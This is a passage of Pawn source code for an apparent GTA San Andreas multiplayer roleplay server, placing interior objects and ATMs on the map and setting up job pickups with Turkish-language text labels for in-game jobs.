	CreateDynamicObject(1890,483.91915900,-2392.20166000,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,480.01214600,-2395.14526400,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,483.91198700,-2395.12036100,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.91915900,-2398.05224600,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.91915900,-2400.97949200,9.78272600,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,483.91287200,-2403.88818400,9.78243600,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,479.99008200,-2398.14819300,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,479.94009400,-2401.07348600,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,479.91510000,-2404.02465800,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2395.20532200,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2395.14526400,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(2365,481.95449800,-2381.40698200,9.78423100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2365,481.95449800,-2381.38208000,10.07572000,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2384.01928700,10.35518100,0.00000000,1.71887339,-90.24079544, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2384.51733400,10.35518100,0.00000000,1.71887339,-90.24079544, .interiorid = 18);
	CreateDynamicObject(1349,481.83047500,-2386.24243200,10.35518100,0.00000000,1.71887339,-51.56614427, .interiorid = 18);
	CreateDynamicObject(1349,487.19693000,-2386.69409200,10.35294000,0.00000000,1.71887339,260.40943248, .interiorid = 18);
	CreateDynamicObject(2365,483.75006100,-2389.97168000,9.78319500,0.00000000,0.00000000,94.53803620, .interiorid = 18);
	CreateDynamicObject(2365,475.91857900,-2393.15820300,9.78712900,0.00000000,0.00000000,94.53803620, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2398.15454100,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,476.08337400,-2401.10668900,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2404.04956100,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2398.09448200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45840500,-2401.05688500,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45840500,-2404.00708000,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2406.87548800,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,479.91510000,-2406.97387700,9.78434000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2407.02465800,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,485.17611700,-2421.95288100,9.78149000,0.00000000,0.00000000,-178.76300397, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2412.79882800,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,483.92062400,-2415.79785200,9.78221300,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1845,482.43237300,-2424.07226600,9.78731700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1845,482.45736700,-2427.02246100,9.78731700,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(1845,482.45736700,-2429.94873000,9.78731700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,485.32608000,-2431.95092800,9.78149000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1848,485.31097400,-2426.82568400,9.78730800,0.00000000,0.00000000,269.00351293, .interiorid = 18);
	CreateDynamicObject(1842,478.89740000,-2424.58203100,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,478.87240600,-2429.21142600,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,479.88073700,-2412.85937500,9.78417300,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,479.89468400,-2415.85253900,9.78445900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2412.79760700,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,476.06506300,-2415.74487300,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1991,454.33581500,-2397.91992200,9.81896800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2394.97680700,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1996,454.32177700,-2393.97998000,9.81063400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2406.94409200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2395.95092800,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2396.92407200,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2409.87036100,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,472.43722500,-2412.82153300,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.44009400,-2415.74487300,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.44009400,-2418.69409200,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2421.62524400,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2424.57348600,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,472.45260600,-2427.52172900,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.46508800,-2430.46997100,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2412,479.30438200,-2378.38232400,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2412,476.35424800,-2378.30761700,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2400.86743200,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2403.84057600,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,468.43347200,-2406.80395500,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,468.43347200,-2409.75317400,9.78643000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2412.67797900,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2415.65307600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,468.44015500,-2418.57641600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2421.51293900,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2424.45922900,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1848,488.30081200,-2434.88085900,9.78730800,0.00000000,0.00000000,-89.38147334, .interiorid = 18);
	CreateDynamicObject(1890,484.38366700,-2437.15112300,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1848,488.35080000,-2439.83203100,9.78730800,0.00000000,0.00000000,-90.24091003, .interiorid = 18);
	CreateDynamicObject(1890,481.43377700,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,478.50869800,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1884,475.58224500,-2437.13354500,9.77759300,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1889,469.69757100,-2437.13232400,9.76570700,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2427.38549800,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2430.33569300,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,466.73388700,-2437.12622100,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,463.68402100,-2436.25659200,9.78730800,0.00000000,0.00000000,147.82316844, .interiorid = 18);
	CreateDynamicObject(1890,461.40927100,-2434.00659200,9.78730800,0.00000000,0.00000000,122.89938976, .interiorid = 18);
	CreateDynamicObject(1890,460.53448500,-2430.87915000,9.78730800,0.00000000,0.00000000,90.24073814, .interiorid = 18);
	CreateDynamicObject(1889,460.51226800,-2427.88354500,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1842,476.09741200,-2424.58203100,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,476.09741200,-2429.20654300,10.25606400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,460.56561300,-2424.89941400,10.25791500,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,460.59060700,-2422.02685500,10.25791500,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1889,464.56225600,-2427.38549800,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,464.57769800,-2424.44897500,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1890,464.57769800,-2421.49877900,9.78730800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2418.55151400,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2415.60229500,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,464.56524700,-2412.62915000,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,463.88546800,-2409.50683600,9.79196000,0.00000000,0.00000000,-66.17662534, .interiorid = 18);
	CreateDynamicObject(1889,461.83560200,-2407.03662100,9.79196000,0.00000000,0.00000000,-34.37752500, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2406.06250000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2411.01074200,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,458.78555300,-2415.23584000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1842,464.43753100,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,461.36248800,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,458.18759200,-2400.77929700,10.26877400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,476.07522600,-2429.21582000,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,476.07522600,-2424.56933600,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,478.90008500,-2424.56933600,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,478.87509200,-2429.21679700,9.73732100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,458.17645300,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,461.35122700,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,464.42614700,-2400.77343800,9.75003100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1890,478.50869800,-2441.45092800,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1890,475.55880700,-2441.45092800,9.78730800,0.00000000,0.00000000,179.62232607, .interiorid = 18);
	CreateDynamicObject(1889,472.61200000,-2441.41967800,9.76514600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,469.66204800,-2441.41967800,9.76514600,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1987,464.92349200,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,465.89694200,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1987,461.59832800,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,462.57202100,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1884,481.45620700,-2441.46118200,9.77500600,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1884,484.40597500,-2441.46118200,9.77500600,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(1889,476.54007000,-2420.37280300,9.78541500,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,455.48580900,-2419.48388700,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.53579700,-2423.52880900,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.56079100,-2427.32470700,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1889,455.61077900,-2431.07373000,9.79196000,0.00000000,0.00000000,-0.00005730, .interiorid = 18);
	CreateDynamicObject(1991,454.33581500,-2408.24560500,9.81896800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2407.27465800,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2406.27563500,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2405.29858400,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2404.30053700,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2403.30444300,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1981,454.32482900,-2402.30835000,9.81466500,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1996,454.32177700,-2401.32666000,9.81063400,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2437.37011700,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2438.31640600,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2439.29052700,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2440.23681600,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1989,454.67102100,-2441.15820300,9.75281800,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(1846,460.54464700,-2424.89379900,9.73917100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1846,460.56964100,-2422.01831100,9.73917100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(1842,459.08441200,-2437.38598600,10.22056800,0.00000000,0.00000000,131.49392857, .interiorid = 18);
	CreateDynamicObject(1846,459.06817600,-2437.37939500,9.70182400,0.00000000,0.00000000,-48.98789148, .interiorid = 18);
	CreateDynamicObject(1987,458.49835200,-2441.61425800,9.75987100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1988,459.47222900,-2441.59741200,9.75503300,0.00000000,0.00000000,0.85943669, .interiorid = 18);
	CreateDynamicObject(1889,468.41217000,-2433.28393600,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1889,464.56225600,-2430.30688500,9.78414700,0.00000000,0.00000000,-90.24085273, .interiorid = 18);
	CreateDynamicObject(1884,472.46508800,-2433.42016600,9.78434000,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,454.43652300,-2410.16333000,9.80253900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,454.48651100,-2417.21020500,9.80253900,0.00000000,0.00000000,90.24085273, .interiorid = 18);
	CreateDynamicObject(2541,480.01019300,-2393.15820300,9.78999900,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,487.65844700,-2390.20800800,9.78641000,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,472.45776400,-2393.13549800,9.79382200,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,454.30514500,-2392.00537100,9.83844100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2542,454.30514500,-2391.03222700,9.83844100,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2542,454.36703500,-2399.57348600,9.84879000,0.00000000,0.00000000,89.38141604, .interiorid = 18);
	CreateDynamicObject(2871,457.48605300,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2871,458.43594400,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2871,459.41070600,-2446.50805700,9.74788400,0.00000000,0.00000000,179.62238337, .interiorid = 18);
	CreateDynamicObject(2543,461.85641500,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2543,462.83136000,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2543,463.80636600,-2446.40673800,9.51721200,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2542,466.05529800,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,467.03018200,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2542,468.00500500,-2446.38793900,9.75391500,0.00000000,0.00000000,180.48176276, .interiorid = 18);
	CreateDynamicObject(2541,474.92309600,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2541,475.92303500,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2541,476.89804100,-2446.23535200,9.70359800,0.00000000,0.00000000,180.48187735, .interiorid = 18);
	CreateDynamicObject(2583,479.35000600,-2446.36889600,10.59204000,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(2582,483.32833900,-2446.33325200,10.62340500,0.00000000,0.00000000,180.48193465, .interiorid = 18);
	CreateDynamicObject(2582,484.80322300,-2446.33325200,10.62340500,0.00000000,0.00000000,180.48193465, .interiorid = 18);
	CreateDynamicObject(2942,487.70999100,-2383.75439500,10.42487400,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(2942,487.70999100,-2382.95752000,10.42487400,0.00000000,0.00000000,-89.38141604, .interiorid = 18);
	CreateDynamicObject(2412,483.72915600,-2378.35742200,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2412,486.75384500,-2378.35742200,9.80765400,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2385.82763700,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2401.75097700,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2418.64746100,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(14439,475.54144300,-2435.27002000,18.92340100,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(2583,480.82501200,-2446.36889600,10.59204000,0.00000000,0.00000000,180.48182006, .interiorid = 18);
	CreateDynamicObject(7493,488.62420700,-2424.43994100,23.43117500,0.00000000,-180.48210654,180.48182006, .interiorid = 18);
	CreateDynamicObject(994,480.97076400,-2384.01464800,9.89794700,0.00000000,0.00000000,88.52197935, .interiorid = 18);
	CreateDynamicObject(1889,459.35699500,-2393.92797900,9.79353900,0.00000000,0.00000000,0.00000000, .interiorid = 18);
	CreateDynamicObject(1889,463.85675000,-2393.95288100,9.79353900,0.00000000,0.00000000,0.00000000, .interiorid = 18);



	// ATMs
	CreateDynamicObject(2942, 2065.439453125, -1897.5510253906, 13.19670009613, 0, 0, 0);
	CreateDynamicObject(2942, 2093.5124511719, -1359.5474853516, 23.62727355957, 0, 0, 0);
	CreateDynamicObject(2942, 1155.6235351563, -1464.9141845703, 15.44321346283, 0, 0, 290.21020507813);
	CreateDynamicObject(2942, 2139.4487304688, -1164.0811767578, 23.63508605957, 0, 0, 91.309509277344);
	CreateDynamicObject(2942, 387.16552734375, -1816.0512695313, 7.4834146499634, 0, 0, 272.48046875);
	CreateDynamicObject(2942, -24.385023117065, -92.001075744629, 1003.1897583008, 0, 0, 180.54052734375);
	CreateDynamicObject(2942, -31.811220169067, -58.106018066406, 1003.1897583008, 0, 0, 181.21594238281);
	CreateDynamicObject(2942, 1212.7785644531, 2.451762676239, 1000.5647583008, 0, 0, 0);
	CreateDynamicObject(2942, 2324.4028320313, -1644.9445800781, 14.469946861267, 0, 0, 0);
	CreateDynamicObject(2942, 2228.39, -1707.78, 13.25, 0.000000, 0.000000, 270.000000); // Ganton Gym ATM
	CreateDynamicObject(2942, 651.19305419922, -520.48815917969, 15.978837013245, 0, 0, 0);
	CreateDynamicObject(2942, 45.78035736084, -291.80926513672, 1.5024013519287, 0, 0, 182.93444824219);
	CreateDynamicObject(2942, 1275.7958984375, 368.31481933594, 19.19758605957, 0, 0, 73.759948730469);
	CreateDynamicObject(2942, 2303.4577636719, -13.539554595947, 26.12727355957, 0, 0, 272.43542480469);
	CreateDynamicObject(2942, 691.08215332031, -618.5625, 15.978837013245, 0, 0, 268.69067382813);
	CreateDynamicObject(2942, 173.23471069336, -155.07606506348, 1.2210245132446, 0, 0, 89.730041503906);
	CreateDynamicObject(2942, 1260.8796386719, 209.30152893066, 19.19758605957, 0, 0, 65.504638671875);
	CreateDynamicObject(2942, 2316.1015625, -88.522567749023, 26.12727355957, 0, 0, 0);

	// Job Pickups
	CreatePickup(1210, 23, 241.0634, 112.8905, 1003.2188, -1); // Detective job (LS)
	CreatePickup(1210, 23, 1215.1304, -11.8431, 1000.9219, -1); //Whore Registration (LS)
 	CreatePickup(1210, 23, 378.58, -114.26, 1001.49, -1); // Pizza Boy job (Interior) (LS)
 	CreatePickup(1210, 23, 2166.3772, -1675.3829, 15.0859, -1); // Drug Dealer job
 	CreatePickup(1210, 23, 2354.2808, -1169.2959, 28.0066, -1); //Drug Smuggler (LS)
 	CreatePickup(1210, 23, 1380.8955, -1088.6808, 27.3844, -1); //Lawyer Registration
 	CreatePickup(1210, 23, 2226.1716, -1718.1792, 13.5165, -1); //BodyGuard Registration (LS)
 	CreatePickup(1210, 23, 1099.73, -1504.67, 15.800, -1); //Bodyguard (All Saints Mall) Registration
 	CreatePickup(1210, 23, 1366.4325, -1275.2096, 13.5469, -1); //ArmsDealer Registration (LS)
	CreatePickup(1210, 23, 766.0804, 14.5133, 1000.7004, -1); //Boxer Registration (LS)
	CreatePickup(1210, 23, 758.98, -60.32, 1000.78, -1); //Boxer Registration2 (LS)
    CreatePickup(1210, 23, 502.6696, -11.6603, 1000.6797, -1); //Bartender Registration
    CreatePickup(1210, 23, 2195.8335, -1973.0638, 13.5589, -1); //Craftsman Registration
	CreatePickup(1210, 23, 1907.39, -1874.70, 13.53, -1); //arac Mechanic Registration
 	CreatePickup(1210, 23, 2214.979736, -2661.346923, 13.546875, -1); //Trucker registration

 	// Other job pickups
	CreatePickup(1582, 23, 2104.1999511719, -1787.5999755859, 13.60000038147, -1); // Pizza /pizzaal

	// Job 3D text labels
	CreateDynamic3DTextLabel("Dedektiflik Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,241.0634, 112.8905, 1003.2188+0.5,4.0);// Detective Job (LS)
	CreateDynamic3DTextLabel("Hayat Kadýný Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,1215.1304,-11.8431,1000.9219+0.5,4.0);// Whore (LS)
	CreateDynamic3DTextLabel("Pizzacýlýk Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,378.58, -114.26, 1001.49+0.5,4.0);// Pizza Boy Job (LS)
	CreateDynamic3DTextLabel("Uyuþturucu Satýcýsý Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,2166.3772,-1675.3829,15.0859+0.5,4.0);// Drug Dealer (LS)
	CreateDynamic3DTextLabel("Uyuþturucu Kaçakçýsý Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,2354.2808,-1169.2959,28.0066+0.5,4.0);// Drug Smuggler (LS)
    CreateDynamic3DTextLabel("Avukatlýk Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,1380.8955,-1088.6808,27.3844+0.5,4.0);// Lawyer (LS)
    CreateDynamic3DTextLabel("Bodyguard Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,2226.1716,-1718.1792,13.5165+0.5,4.0);// Bodyguard (LS)
    CreateDynamic3DTextLabel("Bodyguard Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,1099.73,-1504.67,15.800+0.5,4.0);// Bodyguard (All Saints Mall)
    CreateDynamic3DTextLabel("Silah Satýcýsý Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,1366.4325,-1275.2096,13.5469+0.5,4.0);// Gun Job (LS)
    CreateDynamic3DTextLabel("Boksör Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,766.0804,14.5133,1000.7004+0.5,4.0);// Boxer
    CreateDynamic3DTextLabel("Boksör Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,758.98,-60.32,1000.78+0.5,4.0);// Boxer2
    CreateDynamic3DTextLabel("Barmen Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,502.6696,-11.6603,1000.6797+0.5,4.0);// Bartender (Alhambra)
    CreateDynamic3DTextLabel("Zanaatkar Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,2195.8335,-1973.0638,13.5589+0.5,4.0);// Craftsman (JUNKYARD LS)
    CreateDynamic3DTextLabel("Tamirci Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,1907.39, -1874.70, 13.53+0.5,4.0);// Mechanic (LS)
	CreateDynamic3DTextLabel("Kamyonculuk Mesleði\nÝþe girmek için /isegir yazýn.",COLOR_YELLOW,2214.979736, -2661.346923, 13.546875+0.5,4.0);// Trucker Job (LS)

	// Other job 3D text labels
/*	CreateDynamic3DTextLabel("Pizza ve götürülcek adres için\n/pizzaal.",COLOR_YELLOW,2104.1999511719, -1787.5999755859, 13.60000038147, 4.0); //pizzaal */
	CreateDynamic3DTextLabel("Dövüþ stilini deðiþtirmek için \n/egitim yaz.",COLOR_YELLOW,758.43,-78.0,1000.65+0.5,4.0);
	CreateDynamic3DTextLabel("Dövüþ stilini deðiþtirmek için \n/egitim yaz.",COLOR_YELLOW,756.229125, 5.614504, 1000.698608+0.5,4.0);

	// General 3D text labels
 	CreateDynamic3DTextLabel("Kýyafet satýn almak için \n/kiyafetal yaz.",COLOR_YELLOW,208.8970,-100.3289,1005.2578,8.0);
    CreateDynamic3DTextLabel("Kýyafet satýn almak için \n/kiyafetal yaz.",COLOR_YELLOW,206.5429,-41.2313,1001.8047,8.0);
    CreateDynamic3DTextLabel("Kýyafet satýn almak için \n/kiyafetal yaz.",COLOR_YELLOW,209.3064,-8.3033,1005.2109,8.0);
    CreateDynamic3DTextLabel("Kýyafet satýn almak için \n/kiyafetal yaz.",COLOR_YELLOW,159.6771,-83.2866,1001.8120,8.0);
